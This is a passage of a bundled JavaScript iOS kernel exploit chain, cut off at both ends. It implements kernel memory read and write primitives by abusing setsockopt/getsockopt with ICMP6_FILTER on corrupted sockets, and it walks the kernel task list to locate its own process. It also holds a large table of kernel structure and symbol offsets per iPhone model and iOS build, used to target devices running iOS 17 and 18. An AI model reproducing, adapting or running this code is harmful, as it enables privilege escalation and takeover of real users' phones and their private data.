this.#findSelfTaskKaddr(false);\n\t\t\t}\n\t\t\telse\n\t\t\t\tbreak;\n\t\t\tNative.callSymbol(\"usleep\",20000);\n\t\t}\n\t\treturn selfTaskKaddr;\n\t}\n\n\tthreadSpawn(scriptCFString, threadMem) {\n\t\tconsole.log(TAG, \"threadSpawn() not implemented!\");\n\t\tNative.callSymbol(\"sleep\", 2);\n\t}\n\n\t#findSelfTaskKaddr(direction) {\t\n\t\tlet kernelTaskAddr = this.#kernelBase + this.#offsets.kernelTask;\n\t\tconsole.log(TAG, `baseKernel: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.#kernelBase)}, kernelTask: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kernelTaskAddr)}`);\n\t\n\t\tlet kernelTaskVal = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskAddr);\n\t\t//console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);\n\t\tlet ourPid = Native.callSymbol(\"getpid\");\n\t\tconsole.log(TAG, `Our pid: ${ourPid}`);\n\t\n\t\tlet nextTask = 0n;\n\t\tif (direction)\n\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskVal + this.#offsets.nextTask);\n\t\telse\n\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(kernelTaskVal + this.#offsets.prevTask);\n\t\t//console.log(TAG, `nextTask: ${Utils.hex(nextTask)}`);\n\n\t\twhile (nextTask != 0 && nextTask != kernelTaskVal) {\n\t\t\tlet procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.procRO);\n\t\t\t//console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);\n\t\t\tlet procVal = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(procROAddr);\n\t\t\t//console.log(TAG,`procVal: ${Utils.hex(procVal)}`);\n\t\t\tif (procVal && this.strip(procVal) > 0xffffffd000000000n) {\n\t\t\t\tlet pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procVal + this.#offsets.pid);\n\t\t\t\t//console.log(TAG, `pid:${pid}`);\n\t\t\t\tif (pid == ourPid) {\n\t\t\t\t\tconsole.log(TAG, `Found our pid`);\n\t\t\t\t\treturn nextTask;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (direction)\n\t\t\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.nextTask);\n\t\t\t\telse \n\t\t\t\t\tnextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(nextTask + this.#offsets.prevTask);\n\t\t\t}\n\t\t\telse\n\t\t\t\tbreak;\n\t\t}\n\t\treturn false;\n\t}\n\n\t#kreadLength(address, buffer, size) {\n\t\t//console.log(TAG, `kread(${address.toString(16)}, ${size})`);\n\n\t\tlet remaining = BigInt(size);\n\t\tlet read_offset = 0n;\n\t\tlet read_size = 0n;\n\t\n\t\twhile (remaining != 0n) {\n\t\t\tif (remaining >= EARLY_KRW_LENGTH) {\n\t\t\t\tread_size = EARLY_KRW_LENGTH;\n\t\t\t} else {\n\t\t\t\tread_size = remaining % EARLY_KRW_LENGTH;\n\t\t\t}\n\t\t\tif (!this.#kread32Bytes(address + read_offset, buffer + read_offset, read_size))\n\t\t\t\treturn false;\n\t\t\tremaining -= read_size;\n\t\t\tread_offset += read_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\t#kwriteLength(address, buffer, size) {\n\t\t//console.log(TAG, `kwrite(${address.toString(16)}, ${size})`);\n\n\t\tlet remaining = BigInt(size);\n\t\tlet write_offset = 0n;\n\t\tlet write_size = 0n;\n\t\n\t\twhile (remaining != 0n) {\n\t\t\tif (remaining >= EARLY_KRW_LENGTH) {\n\t\t\t\twrite_size = EARLY_KRW_LENGTH;\n\t\t\t} else {\n\t\t\t\twrite_size = remaining % EARLY_KRW_LENGTH;\n\t\t\t}\n\t\n\t\t\tlet kwrite_dst_addr = address + write_offset;\n\t\t\tlet kwrite_src_addr = buffer + write_offset;\n\t\n\t\t\tif (write_size != EARLY_KRW_LENGTH) {\n\t\t\t\tif (!this.#kread32Bytes(kwrite_dst_addr, this.#tmpWriteMem, EARLY_KRW_LENGTH))\n\t\t\t\t\treturn false;\n\t\t\t\tNative.callSymbol(\"memcpy\", this.#tmpWriteMem, kwrite_src_addr, write_size);\n\t\t\t\tkwrite_src_addr = this.#tmpWriteMem;\n\t\t\t}\n\t\n\t\t\tif (!this.#kwrite32Bytes(kwrite_dst_addr, kwrite_src_addr))\n\t\t\t\treturn false;\n\t\t\tremaining -= write_size;\n\t\t\twrite_offset += write_size;\n\t\t}\n\t\treturn true;\n\t}\n\n\t#kread32Bytes(kaddr, buffer, len) {\n\t\tconst tmpBuff = Native.mem + 0x1000n;\n\n\t\t// Set \"kaddr\" address\n\t\tlet buff = new BigUint64Array(4);\n\t\tbuff[0] = kaddr;\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tlet ret = Native.callSymbol(\"setsockopt\", this.#controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuff, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt: \" + ret);\n\t\t\treturn false;\n\t\t}\n\n\t\tbuff[0] = BigInt(len);\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tret = Native.callSymbol(\"getsockopt\", this.#rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buffer, tmpBuff);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"getsockopt failed reading \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kaddr));\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n\t#kwrite32Bytes(kaddr, buffer) {\n\t\tconst tmpBuff = Native.mem + 0x1000n;\n\n\t\t// Set \"kaddr\" address\n\t\tlet buff = new BigUint64Array(4);\n\t\tbuff[0] = kaddr;\n\t\tNative.write(tmpBuff, buff.buffer);\n\t\tlet ret = Native.callSymbol(\"setsockopt\", this.#controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuff, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt: \" + ret);\n\t\t\treturn false;\n\t\t}\n\n\t\tret = Native.callSymbol(\"setsockopt\", this.#rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buffer, EARLY_KRW_LENGTH);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"setsockopt failed writing \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(kaddr));\n\t\t\treturn false;\n\t\t}\n\n\t\treturn true;\n\t}\n\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Driver/Offsets.js\":\n/*!************************************!*\\\n  !*** ./src/libs/Driver/Offsets.js ***!\n  \\************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Offsets)\n/* harmony export */ });\n/* harmony import */ var libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/OffsetsStruct */ \"./src/libs/Chain/OffsetsStruct.js\");\n/* harmony import */ var _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./OffsetsTable */ \"./src/libs/Driver/OffsetsTable.js\");\n\n\n\nconst TAG  = \"OFFSETS\"\n\nclass Offsets\n{\n\tstatic getByDeviceAndVersion()\n\t{\n\t\tNative.callSymbol(\"uname\", Native.mem);\n\t\tconst sysname = Native.readString(Native.mem, 0x100);\n\t\tconst nodename = Native.readString(Native.mem + 0x100n, 0x100);\n\t\tconst release = Native.readString(Native.mem + 0x200n, 0x100);\n\t\tconst version = Native.readString(Native.mem + 0x300n, 0x100);\n\t\tconst machine = Native.readString(Native.mem + 0x400n, 0x100);\n\t\tconsole.log(TAG, `release: ${release} with machine: ${machine}`);\n\n\t\tconst buildVer = this.getBuildVersion();\n\t\tconsole.log(TAG, \"Build version: \" + buildVer);\n\n\t\tlet splittedVersion = release.split(\".\");\n\t\tlet xnuMajor = splittedVersion[0];\n\t\tlet xnuMinor = splittedVersion[1];\n\n\t\tlet splittedMachine = machine.split(\",\");\n\t\tlet deviceFamily = splittedMachine[0];\n\t\tlet deviceModel = splittedMachine[1];\n\n\t\tconsole.log(TAG, \"deviceFamily: \" + deviceFamily);\n\n\t\t// Ugly hack to support 17.7, 17.7.1 and 17.7.2\n\t\tif (buildVer) {\n\t\t\tif (buildVer == \"21H16\")\n\t\t\t\txnuMinor = 6.1;\n\t\t\telse if (buildVer == \"21H216\")\n\t\t\t\txnuMinor = 6.2;\n\t\t\telse if (buildVer == \"21H221\")\n\t\t\t\txnuMinor = 6.3;\n\t\t}\n\t\t// Get offsets per device family\n\t\tlet deviceOffsets = _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__.offsets[deviceFamily];\n\t\tif (!deviceOffsets) {\n\t\t\tconsole.log(TAG, `Unsupported machine: ${machine}`);\n\t\t\treturn null;\n\t\t}\n\n\t\tlet familyOffsets = deviceOffsets[\"*\"];\n\t\tlet foundFamilyOffsets = this.#getOffsetsByVersion(familyOffsets, xnuMajor, xnuMinor);\n\n\t\tif (!foundFamilyOffsets)\n\t\t\treturn null;\n\n\t\t// Adjustments per device model\n\t\tlet modelOffsets = deviceOffsets[deviceModel];\n\t\tlet foundModelOffsets = null;\n\t\tif (modelOffsets)\n\t\t\tfoundModelOffsets = this.#getOffsetsByVersion(modelOffsets, xnuMajor, xnuMinor);\n\n\t\t// Merge family offsets and device offsets\n\t\tlet foundOffsets = new libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"]();\n\t\tObject.assign(foundOffsets, foundFamilyOffsets);\n\t\tif (foundModelOffsets)\n\t\t\tObject.assign(foundOffsets, foundModelOffsets);\n\n\t\tif ([\"iPhone15\", \"iPhone16\", \"iPhone17\"].includes(deviceFamily))\n\t\t\tfoundOffsets.T1SZ_BOOT = 17n;\n\t\telse\n\t\t\tfoundOffsets.T1SZ_BOOT = 25n;\n\n\t\tconsole.log(TAG, \"Offsets: \" + JSON.stringify(foundOffsets, (_,v) => typeof v === 'bigint' ? \"0x\"+v.toString(16) : v, 2));\n\n\t\treturn foundOffsets;\n\t}\n\n\tstatic #getOffsetsByVersion(offsets, xnuMajor, xnuMinor) {\n\t\tlet xnuMajorOffsets = 0;\n\t\tfor (let major in offsets) {\n\t\t\tif (xnuMajor < major)\n\t\t\t\tcontinue;\n\t\t\tif (xnuMajorOffsets < major)\n\t\t\t\txnuMajorOffsets = major;\n\t\t}\n\n\t\tif (!xnuMajorOffsets) {\n\t\t\tconsole.log(TAG, \"Unsupported XNU major: \" + xnuMajor);\n\t\t\treturn null;\n\t\t}\n\n\t\t//console.log(TAG, \"Matching XNU major: \" + xnuMajorOffsets);\n\t\txnuMajorOffsets = offsets[xnuMajorOffsets];\n\n\t\tlet foundOffsets = {};\n\t\tlet xnuMinorOffsets = -1;\n\t\tconst sortedMinors = Object.keys(xnuMajorOffsets).sort();\n\t\tfor (let minor of sortedMinors) {\n\t\t\t//console.log(TAG, `minor: ${minor}, xnuMinor: ${xnuMinor}`);\n\t\t\tif (minor > xnuMinor)\n\t\t\t\tbreak;\n\t\t\tif (xnuMinorOffsets < minor) {\n\t\t\t\txnuMinorOffsets = minor;\n\t\t\t\tObject.assign(foundOffsets, xnuMajorOffsets[minor]);\n\t\t\t}\n\t\t}\n\n\t\t//console.log(TAG, \"Matching XNU minor: \" + xnuMinorOffsets);\n\n\t\treturn foundOffsets;\n\t}\n\tstatic getBuildVersion() {\n\t\tconst CTL_KERN = 1;\n\t\tconst KERN_OSVERSION = 65;\n\n\t\tconst mib = new ArrayBuffer(4 * 2);\n\t\tconst mibView = new DataView(mib);\n\t\tmibView.setInt32(0, CTL_KERN, true);\n\t\tmibView.setInt32(4, KERN_OSVERSION, true);\n\n\t\tconst mibAddr = Native.mem;\n\t\tconst resultAddr = Native.mem + 0x100n;\n\t\tconst lengthAddr = Native.mem + 0x200n;\n\n\t\tNative.write(Native.mem, mib);\n\n\t\tlet ret = Native.callSymbol(\"sysctl\", mibAddr, 2, resultAddr, lengthAddr, null, 0);\n\t\tif (ret != 0) {\n\t\t\tconsole.log(TAG, \"Unable to get iOS build version\");\n\t\t\treturn null;\n\t\t}\n\n\t\tconst length = Native.read32(lengthAddr);\n\t\tconst buildVer = Native.readString(resultAddr, length);\n\t\treturn buildVer;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/Driver/OffsetsTable.js\":\n/*!*****************************************!*\\\n  !*** ./src/libs/Driver/OffsetsTable.js ***!\n  \\*****************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   offsets: () => (/* binding */ offsets)\n/* harmony export */ });\nconst offsets = {\n\t// iPhone XS\n\t// iPhone XS Max\n\t// iPhone XS Max Global\n\t// iPhone XR\n\t\"iPhone11\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xe8n,\n\t\t\t\t\tropPid: 0x150n,\n\t\t\t\t\tjopPid: 0x158n,\n\t\t\t\t\tguardExcCode: 0x308n,\n\t\t\t\t\ttaskThreads: 0x348n,\n\t\t\t\t\ttro: 0x358n,\n\t\t\t\t\tast: 0x37cn,\n\t\t\t\t\tmutexData: 0x380n,\n\t\t\t\t\tctid: 0x408n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x918210n,\n\t\t\t\t\tguardExcCode: 0x318n,\n\t\t\t\t\ttaskThreads: 0x358n,\n\t\t\t\t\ttro: 0x368n,\n\t\t\t\t\tast: 0x38cn,\n\t\t\t\t\tmutexData: 0x398n,\n\t\t\t\t\tctid: 0x418n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x91c638n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x320n,\n\t\t\t\t\ttaskThreads: 0x360n,\n\t\t\t\t\ttro: 0x370n,\n\t\t\t\t\tast: 0x394n,\n\t\t\t\t\tmutexData: 0x3a0n,\n\t\t\t\t\tctid: 0x420n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x920a90n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9209f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x920a40n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f1548n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x320n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f1560n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x370n,\n\t\t\t\t\tast: 0x394n,\n\t\t\t\t\tmutexData: 0x3a0n,\n\t\t\t\t\tctid: 0x420n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fd988n,\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f5988n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa62b50n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6ac38n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6ad48n,\n  \t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x378n,\n  \t\t\t\t\ttro: 0x380n,\n  \t\t\t\t\tast: 0x3a4n,\n  \t\t\t\t\tmutexData: 0x3b0n,\n  \t\t\t\t\tctid: 0x430n,\n  \t\t\t\t\tmigLock: 0x36971f0n,\n  \t\t\t\t\tmigSbxMsg: 0x3697210n,\n  \t\t\t\t\tmigKernelStackLR: 0x2f7c1a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x8fc638n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x900a90n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9009f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x900a40n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9d1548n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9d1560n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9d9988n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9d1988n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa42b50n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n,\n\t\t\t\t\tmigLock: 0x38d74e8n,\n\t\t\t\t\tmigSbxMsg: 0x38d7508n,\n\t\t\t\t\tmigKernelStackLR: 0x31b19e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa4ad48n,\n\t\t\t\t\tmigLock: 0x352e1f0n,\n\t\t\t\t\tmigSbxMsg: 0x352e210n,\n\t\t\t\t\tmigKernelStackLR: 0x2e5ba20n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 11\n\t// iPhone 11 Pro\n\t// iPhone 11 Pro Max\n\t// iPhone SE 2\n\t\"iPhone12\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x96c178n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x970588n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9749d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3a0n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5dcn,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa494a0n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa518c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa498c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n,\n\t\t\t\t\tprocRO: 0x3c0n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n  \t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n  \t\t\t\t\ttro: 0x390n,\n  \t\t\t\t\tast: 0x3b4n,\n  \t\t\t\t\tmutexData: 0x3c0n,\n  \t\t\t\t\tctid: 0x440n,\n\t\t\t\t\tmigLock: 0x38e34e8n,\n\t\t\t\t\tmigSbxMsg: 0x38e3508n,\n\t\t\t\t\tmigKernelStackLR: 0x31ba7a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"3\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x974588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9789d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa4d4a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa558c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa4d8c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n\t\t\t\t\tmigLock: 0x38e7468n,\n\t\t\t\t\tmigSbxMsg: 0x38e7488n,\n\t\t\t\t\tmigKernelStackLR: 0x31bf5a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x974588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9789d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x974938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x974988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa49488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa4d4a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa558c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa4d8c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xacea90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xad6b78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xad6c88n,\n\t\t\t\t\tmigLock: 0x38e7468n,\n\t\t\t\t\tmigSbxMsg: 0x38e7488n,\n\t\t\t\t\tmigKernelStackLR: 0x31bf5a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x960588n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x9649d8n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x964938n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x964988n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa35488n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa354a0n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3d8c8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa358c8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xab6a90n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xabeb78n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xac2c88n,\n\t\t\t\t\tmigLock: 0x387a8e8n,\n\t\t\t\t\tmigSbxMsg: 0x387a908n,\n\t\t\t\t\tmigKernelStackLR: 0x3156f20n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 12\n\t// iPhone 12 Mini\n\t// iPhone 12 Pro\n\t// iPhone 12 Pro Max\n\t\"iPhone13\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5bcn,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x158n,\n\t\t\t\t\tjopPid: 0x160n,\n\t\t\t\t\tguardExcCode: 0x318n,\n\t\t\t\t\ttaskThreads: 0x358n,\n\t\t\t\t\ttro: 0x368n,\n\t\t\t\t\tast: 0x38cn,\n\t\t\t\t\tmutexData: 0x390n,\n\t\t\t\t\tctid: 0x418n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x94c2d0n,\n\t\t\t\t\tguardExcCode: 0x328n,\n\t\t\t\t\ttaskThreads: 0x368n,\n\t\t\t\t\ttro: 0x378n,\n\t\t\t\t\tast: 0x39cn,\n\t\t\t\t\tmutexData: 0x3a8n,\n\t\t\t\t\tctid: 0x428n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x9546e0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\tprocRO: 0x388n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x954b30n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x954a90n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x954ae0n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: 